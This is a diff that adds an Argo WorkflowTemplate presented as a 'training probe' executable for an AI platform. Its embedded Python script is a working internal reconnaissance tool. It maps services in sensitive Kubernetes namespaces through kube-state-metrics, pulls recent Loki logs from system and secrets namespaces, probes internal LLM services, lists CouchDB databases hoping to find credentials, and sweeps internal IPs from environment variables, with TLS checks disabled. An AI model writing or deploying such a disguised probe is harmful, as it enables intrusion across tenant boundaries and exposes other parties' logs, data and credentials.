@@ -1,0 +1,178 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v2
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v2"
+    executables.ai.sap.com/description: "training probe v2 - loki + internal svcs"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import socket, ssl, re, json, time, os, urllib.parse
+        import urllib.request, urllib.error
+
+        def report(k, v):
+            print(f"[PT2] {k}: {str(v)[:10000]}", flush=True)
+
+        def http_get(url, headers=None, timeout=10):
+            try:
+                req = urllib.request.Request(url, headers=headers or {})
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+                    return r.read().decode(errors="replace"), r.status, dict(r.headers)
+            except urllib.error.HTTPError as e:
+                body = ""
+                try: body = e.read().decode(errors="replace")[:3000]
+                except: pass
+                return f"HTTP_{e.code}:{body}", e.code, {}
+            except Exception as e:
+                return f"ERR:{type(e).__name__}:{e}", 0, {}
+
+        report("START", "probe-train-v2")
+
+        # 1. KSM: find ALL service IPs in sensitive namespaces
+        report("---", "=== 1. KSM SERVICE DISCOVERY ===")
+        ksm_body, ksm_code, _ = http_get(
+            "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics",
+            timeout=20)
+        if ksm_code == 200:
+            # Find services in loki namespace
+            loki_svcs = re.findall(
+                r'kube_service_info\{([^}]*namespace="loki"[^}]*)\}',
+                ksm_body)
+            report("KSM_LOKI_NAMESPACE_SVCS", loki_svcs[:20])
+            loki_ips = re.findall(
+                r'kube_service_info\{[^}]*namespace="loki"[^}]*cluster_ip="([^"]+)"',
+                ksm_body)
+            report("KSM_LOKI_IPS", loki_ips)
+            loki_names = re.findall(
+                r'kube_service_info\{[^}]*namespace="loki"[^}]*service="([^"]+)"',
+                ksm_body)
+            report("KSM_LOKI_SVC_NAMES", loki_names)
+
+            # Find services in other interesting namespaces
+            for ns in ["cluster-secrets", "llm-orchestration", "llm-access",
+                       "rage-proxy-inference", "prompt-registry-api",
+                       "prompt-registry-k8s-server", "not-diamond", "couchdb",
+                       "ml-api-facade", "feedback-service"]:
+                svcs = re.findall(
+                    r'kube_service_info\{([^}]*namespace="' + ns + r'"[^}]*)\}',
+                    ksm_body)
+                if svcs:
+                    report(f"KSM_{ns}_SVCS", svcs[:10])
+                    ips = re.findall(
+                        r'kube_service_info\{[^}]*namespace="' + ns + r'"[^}]*cluster_ip="([^"]+)"',
+                        ksm_body)
+                    report(f"KSM_{ns}_IPS", ips)
+
+        # 2. LOKI: try by service names in loki namespace
+        report("---", "=== 2. LOKI ACCESS ===")
+        loki_endpoints = []
+        # Build from KSM data if available
+        if ksm_code == 200:
+            for name in loki_names:
+                loki_endpoints.append((f"{name}.loki.svc.cluster.local", 80))
+                loki_endpoints.append((f"{name}.loki.svc.cluster.local", 3100))
+            for ip in loki_ips:
+                loki_endpoints.append((ip, 80))
+                loki_endpoints.append((ip, 3100))
+
+        # Also try common names
+        for name in ["loki", "loki-gateway", "loki-read", "loki-write",
+                     "loki-query-frontend", "loki-distributor", "loki-querier",
+                     "gateway"]:
+            loki_endpoints.append((f"{name}.loki.svc.cluster.local", 80))
+            loki_endpoints.append((f"{name}.loki.svc.cluster.local", 3100))
+
+        for host, port in loki_endpoints:
+            body, code, hdrs = http_get(f"http://{host}:{port}/ready", timeout=6)
+            if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                report(f"LOKI_{host}:{port}_ready", f"[{code}] {body[:400]}")
+                if code == 200:
+                    body2, c2, _ = http_get(f"http://{host}:{port}/loki/api/v1/labels", timeout=8)
+                    report(f"LOKI_{host}_LABELS", f"[{c2}] {body2[:3000]}")
+                    for ns in ["velero", "argocd", "aicore", "kube-system", "loki",
+                               "llm-orchestration", "cluster-secrets"]:
+                        q = urllib.parse.quote('{namespace="' + ns + '"}')
+                        now = int(time.time() * 1e9)
+                        url = (f"http://{host}:{port}/loki/api/v1/query_range"
+                               f"?query={q}&start={now - 3600*int(1e9)}&end={now}&limit=20")
+                        body3, c3, _ = http_get(url, timeout=10)
+                        if c3 == 200:
+                            report(f"LOKI_LOGS_{ns}", body3[:5000])
+
+        # 3. LLM-ORCHESTRATION services
+        report("---", "=== 3. LLM SERVICES ===")
+        for svc in ["llm-orchestration", "llm-access", "rage-proxy-inference",
+                    "not-diamond"]:
+            for port in [80, 443, 8080, 8443]:
+                body, code, _ = http_get(
+                    f"http://{svc}.{svc}.svc.cluster.local:{port}/", timeout=5)
+                if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"SVC_{svc}:{port}", f"[{code}] {body[:500]}")
+
+        # Try IPs from KSM
+        if ksm_code == 200:
+            for ns in ["llm-orchestration", "llm-access", "rage-proxy-inference"]:
+                ns_ips = re.findall(
+                    r'kube_service_info\{[^}]*namespace="' + ns + r'"[^}]*cluster_ip="([^"]+)"',
+                    ksm_body)
+                for ip in ns_ips[:5]:
+                    for port in [80, 443, 8080]:
+                        body, code, _ = http_get(f"http://{ip}:{port}/", timeout=5)
+                        if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                            report(f"SVC_IP_{ip}:{port}", f"[{code}] {body[:500]}")
+
+        # 4. COUCHDB (database - might expose credentials in API)
+        report("---", "=== 4. COUCHDB ===")
+        for host in ["couchdb.couchdb.svc.cluster.local",
+                     "couchdb-svc.couchdb.svc.cluster.local"]:
+            for port in [5984, 80, 6984]:
+                body, code, hdrs = http_get(f"http://{host}:{port}/", timeout=6)
+                if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"COUCHDB_{host}:{port}", f"[{code}] {body[:1000]}")
+                    if code == 200:
+                        # Try to list databases
+                        body2, c2, _ = http_get(f"http://{host}:{port}/_all_dbs", timeout=5)
+                        report(f"COUCHDB_DBS_{host}", f"[{c2}] {body2[:2000]}")
+
+        # 5. ML-API-FACADE (AI Core internal API gateway)
+        report("---", "=== 5. ML-API-FACADE ===")
+        for host in ["ml-api-facade.ml-api-facade.svc.cluster.local"]:
+            for port in [80, 443, 8080]:
+                body, code, _ = http_get(f"http://{host}:{port}/", timeout=5)
+                if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"MLAPIFACADE_{port}", f"[{code}] {body[:500]}")
+
+        # 6. ENV var cross-deployment IPs (are they reachable?)
+        report("---", "=== 6. CROSS-DEPLOYMENT IPs FROM ENV ===")
+        # Extract all unique ClusterIPs from env vars
+        env_ips = set()
+        for k, v in os.environ.items():
+            if "_TCP_ADDR" in k or "_SERVICE_HOST" in k:
+                m = re.match(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$', v)
+                if m and not v.startswith("127.") and not v.startswith("169."):
+                    env_ips.add(v)
+        report("ENV_UNIQUE_IPS", sorted(env_ips))
+
+        # Try to reach them on port 80
+        for ip in sorted(env_ips)[:20]:
+            body, code, _ = http_get(f"http://{ip}/", timeout=3)
+            if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                report(f"ENV_IP_{ip}:80", f"[{code}] {body[:300]}")
+
+        report("DONE", "probe-train-v2 complete")
+        EOF
+  entrypoint: probe
